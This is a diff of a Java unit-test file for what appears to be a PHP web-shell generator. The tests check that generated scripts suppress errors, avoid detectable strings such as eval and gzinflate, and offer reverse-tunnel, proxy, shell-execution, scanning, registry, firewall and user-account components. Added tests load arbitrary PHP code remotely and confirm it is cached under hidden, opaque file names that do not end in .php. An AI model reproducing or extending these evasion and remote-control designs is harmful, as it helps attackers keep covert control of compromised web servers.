@@ -1,18 +1,26 @@
 package org.leo.phpcore.generator;
 
 import org.junit.jupiter.api.Test;
+import org.junit.jupiter.api.Assumptions;
+import org.junit.jupiter.api.io.TempDir;
 import org.leo.core.entity.Disguise;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.runtime.PuppetRuntime;
+import org.leo.core.util.json.PortableJsonCodec;
 
 import java.io.ByteArrayOutputStream;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.attribute.FileTime;
 import java.util.Base64;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.zip.Inflater;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
@@ -35,10 +43,11 @@ class PhpScriptGeneratorProviderTest {
         String source = artifact.getContent();
         assertEquals("php", artifact.getFileExtension());
         assertEquals(2, ((Number) artifact.getMetadata().get("protocolVersion")).intValue());
-        assertEquals("M0-M3", artifact.getMetadata().get("coreProtocol"));
+        assertEquals("Envelope", artifact.getMetadata().get("coreProtocol"));
         assertEquals("compact", artifact.getMetadata().get("outputMode"));
         assertEquals("minified-php", artifact.getMetadata().get("bootstrapEncoding"));
         assertEquals("fixed-seed", artifact.getMetadata().get("generationSeed"));
+        assertEquals("seed-derived-opaque-v1", artifact.getMetadata().get("cacheLayout"));
         assertTrue(source.startsWith("<?php"));
         assertFalse(source.contains("gzinflate"));
         assertFalse(source.contains("eval("));
@@ -47,13 +56,15 @@ class PhpScriptGeneratorProviderTest {
         assertTrue(source.contains("function leo_request_decode($body)"));
         assertTrue(source.contains("@error_reporting(0);"));
         assertTrue(source.contains("['componentKey']"));
-        assertTrue(source.contains("===0"));
-        assertTrue(source.contains("===1"));
-        assertTrue(source.contains("===2"));
-        assertTrue(source.contains("===3"));
+        assertTrue(source.contains("'PING'"));
+        assertTrue(source.contains("'RELAY'"));
+        assertTrue(source.contains("'COMPONENT_LOAD'"));
+        assertTrue(source.contains("'COMPONENT_INVOKE'"));
         assertFalse(source.contains("phpcore_"));
+        assertFalse(source.contains(".pc-"));
+        assertFalse(source.contains("*.php"));
+        assertFalse(source.contains("{{CACHE_"));
         assertFalse(source.contains("componentDigest"));
-        assertFalse(source.contains("'msg'"));
         assertFalse(source.contains("hash_file('sha256'"));
         assertFalse(source.contains("hash('sha256'"));
         assertFalse(source.contains("function leo_basic_info"));
@@ -63,18 +74,38 @@ class PhpScriptGeneratorProviderTest {
         assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("HttpRequestComponent"));
         assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ProxyForwardComponent"));
         assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ReverseTunnelComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ProcessComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("NetworkInfoComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("DiskComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("NetworkConnectionComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ScanComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ServiceComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ScheduledTaskComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("RegistryComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("EventLogComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("FirewallComponent"));
+        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("UserAccountComponent"));
         assertTrue(artifact.getMetadata().get("componentRequirements") instanceof Map<?, ?>);
         Map<?, ?> componentRequirements = (Map<?, ?>) artifact.getMetadata().get("componentRequirements");
         Map<?, ?> databaseRequirements = (Map<?, ?>) componentRequirements.get("DatabaseComponent");
         assertEquals(List.of("PDO"), databaseRequirements.get("classes"));
         assertTrue(((List<?>) databaseRequirements.get("pdoDriversAnyOf"))
                 .containsAll(List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")));
+        assertEquals(List.of("ZipArchive"),
+                ((Map<?, ?>) componentRequirements.get("CompressComponent")).get("classes"));
+        assertEquals(List.of("ZipArchive"),
+                ((Map<?, ?>) componentRequirements.get("DecompressComponent")).get("classes"));
+        assertEquals(List.of("shell_exec", "exec"),
+                ((Map<?, ?>) componentRequirements.get("ProcessComponent")).get("functionsAnyOf"));
+        assertEquals(List.of("stream_socket_client"),
+                ((Map<?, ?>) componentRequirements.get("ScanComponent")).get("functions"));
         assertEquals(List.of(), artifact.getMetadata().get("bundledComponents"));
         Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
         assertFalse(requirements.containsKey("extensions"));
         assertFalse(requirements.containsKey("functions"));
         assertTrue(source.length() < portable.getContent().length());
-        assertTrue(source.length() < 8_000, "minimal compact bootstrap regressed in size");
+        assertTrue(source.length() < 9_000,
+                "minimal compact bootstrap regressed in size: " + source.length());
     }
 
     @Test
@@ -135,6 +166,113 @@ class PhpScriptGeneratorProviderTest {
     }
 
     @Test
+    void generatedPhpCoreExecutesEnvelopePing(@TempDir Path tempDir) throws Exception {
+        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
+        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
+        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
+                Map.of("outputMode", "portable", "seed", "envelope-ping"));
+        String source = artifact.getContent().replace(
+                "file_get_contents('php://input')", "$argv[1]");
+        Path script = tempDir.resolve("envelope.php");
+        Files.writeString(script, source, StandardCharsets.UTF_8);
+        Map<String, Object> request = Map.of(
+                "requestId", "request-php-1",
+                "operation", "PING",
+                "params", Map.of());
+        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+
+        Process process = new ProcessBuilder("php", script.toString(), wire)
+                .redirectErrorStream(true).start();
+        byte[] output = process.getInputStream().readAllBytes();
+        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
+        Map<String, Object> response = PortableJsonCodec.decode(
+                Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
+
+        assertEquals("request-php-1", response.get("requestId"));
+        assertEquals(200, ((Number) response.get("code")).intValue());
+        assertTrue(response.get("data") instanceof Map<?, ?>);
+        assertTrue(((Map<?, ?>) response.get("data")).containsKey("hostId"));
+    }
+
+    @Test
+    void generatedPhpCoreUsesSeedDerivedOpaqueCacheLayout(@TempDir Path tempDir) throws Exception {
+        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
+        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
+        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
+                Map.of("outputMode", "portable", "seed", "opaque-cache-layout"));
+        Path script = tempDir.resolve("endpoint.php");
+        Files.writeString(script, artifact.getContent().replace(
+                "file_get_contents('php://input')", "$argv[1]"), StandardCharsets.UTF_8);
+        String componentKey = "a".repeat(80);
+        String componentSource = "<?php return ['id'=>'FixtureComponent','version'=>'1.0.0',"
+                + "'handle'=>function($action,$params){return ['code'=>200];}];";
+        Map<String, Object> request = Map.of(
+                "requestId", "request-load-1",
+                "operation", "COMPONENT_LOAD",
+                "component", "FixtureComponent",
+                "params", Map.of("componentKey", componentKey, "source", componentSource));
+        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+
+        Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
+                script.toString(), wire).redirectErrorStream(true).start();
+        byte[] output = process.getInputStream().readAllBytes();
+        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
+        Map<String, Object> response = PortableJsonCodec.decode(
+                Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
+        assertEquals(200, ((Number) response.get("code")).intValue());
+
+        List<Path> cached;
+        try (var paths = Files.walk(tempDir)) {
+            cached = paths.filter(Files::isRegularFile).filter(path -> !path.equals(script)).toList();
+        }
+        assertEquals(1, cached.size());
+        String directoryName = cached.get(0).getParent().getFileName().toString();
+        String fileName = cached.get(0).getFileName().toString();
+        assertTrue(directoryName.matches("\\.[a-f0-9]{14}"), directoryName);
+        assertTrue(fileName.matches("[a-f0-9]{40}\\.(cache|dat|bin|idx)"), fileName);
+        assertFalse(fileName.contains("FixtureComponent"));
+        assertFalse(fileName.endsWith(".php"));
+    }
+
+    @Test
+    void generatedPhpCoreBoundsAndExpiresComponentCache(@TempDir Path tempDir) throws Exception {
+        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
+        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
+        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
+                Map.of("outputMode", "portable", "seed", "bounded-cache"));
+        String source = artifact.getContent().replace("file_get_contents('php://input')", "$argv[1]");
+        Matcher directoryMatcher = Pattern.compile("\\.([a-f0-9]{14})").matcher(source);
+        Matcher suffixMatcher = Pattern.compile("\\*\\.([a-z]{3,5})").matcher(source);
+        assertTrue(directoryMatcher.find());
+        assertTrue(suffixMatcher.find());
+        Path cacheDirectory = tempDir.resolve("." + directoryMatcher.group(1));
+        Files.createDirectories(cacheDirectory);
+        String suffix = suffixMatcher.group(1);
+        long oldTime = System.currentTimeMillis() - 8L * 24 * 60 * 60 * 1000;
+        for (int index = 0; index < 55; index++) {
+            Path cached = cacheDirectory.resolve(String.format("%040x.%s", index, suffix));
+            Files.writeString(cached, "<?php return ['id'=>'Fixture" + index
+                    + "','handle'=>function($action,$params){return ['code'=>200];}];");
+            if (index == 0) Files.setLastModifiedTime(cached, FileTime.fromMillis(oldTime));
+        }
+
+        Path script = tempDir.resolve("endpoint.php");
+        Files.writeString(script, source, StandardCharsets.UTF_8);
+        Map<String, Object> request = Map.of("requestId", "request-cache-sweep",
+                "operation", "PING", "params", Map.of());
+        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+        Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
+                script.toString(), wire).redirectErrorStream(true).start();
+        byte[] output = process.getInputStream().readAllBytes();
+        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
+
+        try (var files = Files.list(cacheDirectory)) {
+            assertEquals(48, files.filter(Files::isRegularFile).count());
+        }
+        assertFalse(Files.exists(cacheDirectory.resolve(String.format("%040x.%s", 0, suffix))));
+    }
+
+    @Test
     void rejectsLegacyOrNonPhpDisguises() {
         Disguise legacy = disguise("legacy");
         legacy.setProtocolVersion(1);
@@ -167,6 +305,14 @@ class PhpScriptGeneratorProviderTest {
         disguise.setPhpEncodeBody("return base64_encode(json_encode(leo_wire_encode($payload))); ");
         disguise.setPhpDecodeBody("return leo_wire_decode(json_decode(base64_decode($body), true));");
         return disguise;
+    }
+
+    private boolean phpAvailable() {
+        try {
+            return new ProcessBuilder("php", "-v").redirectErrorStream(true).start().waitFor() == 0;
+        } catch (Exception ignored) {
+            return false;
+        }
     }
 
     private String unpack(String wrapper) throws Exception {
